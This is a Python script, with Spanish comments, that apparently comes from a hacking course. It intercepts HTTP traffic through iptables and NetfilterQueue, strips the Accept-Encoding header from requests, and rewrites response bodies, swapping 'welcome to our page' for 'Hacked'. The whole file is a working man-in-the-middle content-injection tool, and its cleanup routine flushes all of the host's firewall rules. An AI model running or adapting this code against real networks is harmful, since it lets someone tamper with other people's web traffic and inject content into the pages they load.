#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import re
import sys
import signal
import os
from termcolor import colored


def def_handler(sig,frame):
  print(colored(f"\n[+] Saliendo...\n","red"))
  drequirements()
  sys.exit(1)


signal.signal(signal.SIGINT,def_handler)


def requirements():
  os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
  os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
  os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
  os.system("iptables --policy FORWARD ACCEPT")


def drequirements():
  os.system("iptables -D INPUT 1")
  os.system("iptables -D INPUT -j NFQUEUE --queue-num 0")
  os.system("iptables -D OUTPUT -j NFQUEUE --queue-num 0")
  os.system("iptables -D FORWARD -j NFQUEUE --queue-num 0")
  os.system("iptables -F")
  os.system("iptables --policy INPUT ACCEPT")
  os.system("iptables --policy OUTPUT ACCEPT")
  os.system("iptables --policy FORWARD DROP")

def set_load(packet,load): # Creamos una función donde gestionaremos la lógica para modificar el campo load (Request)
  packet[scapy.Raw].load = load # Igualamos el load actual por el load modificado

  del packet[scapy.IP].len # Borramos el campo len de IP
  del packet[scapy.IP].chksum # Borramos el campo chksum de IP
  del packet[scapy.TCP].chksum # Borramos el campo chksum de TCP
# De esta forma vulneramos la verificación de paquetes

  return packet


def process_packet(packet): # Creamos una función donde gestionaremos la lógica al tratar cada paquete
  scapy_packet=scapy.IP(packet.get_payload()) # Guardamos en una variable los paquetes IP


  if scapy_packet.haslayer(scapy.Raw): # Si tiene el campo Raw
    try:
      if scapy_packet[scapy.TCP].dport==80: # Si el destino del paquete es el puerto 80 (Request)
        modified_load= re.sub(b"Accept-Encoding:.*?\\r\\n",b"",scapy_packet[scapy.Raw].load) # Con re sustituimos el campo Accept-Encoding por una cadena vacía
        new_packet= set_load(scapy_packet,modified_load) # Creamos un nuevo paquete con el load modificado en la función set_load
        packet.set_payload(new_packet.build()) # Mandamos el nuevo paquete creado

      elif scapy_packet[scapy.TCP].sport==80: # Si el origen del paquete es el puerto 80 (Reply)
        modified_load= scapy_packet[scapy.Raw].load.replace(b"welcome to our page", b"Hacked") # Remplazamos el campo load por lo que queramos
        new_packet=set_load(scapy_packet,modified_load) # Creamos un nuevo paquete con el load modificado en la función set_load
        packet.set_payload(new_packet.build()) # Mandamos el nuevo paquete creado

    except:
      pass

  packet.accept() # Aceptamos los paquetes en cola




def main():
  requirements()
  queue=netfilterqueue.NetfilterQueue() # Creamos el objeto queue
  queue.bind(0, process_packet) # Nos asociamos al número de cola 0 cambiado del iptables y cada paquete lo tratamos con la función process_packet
  queue.run() # Con run se va ha estar analizando todos los paquetes

if __name__=='__main__':
  main()
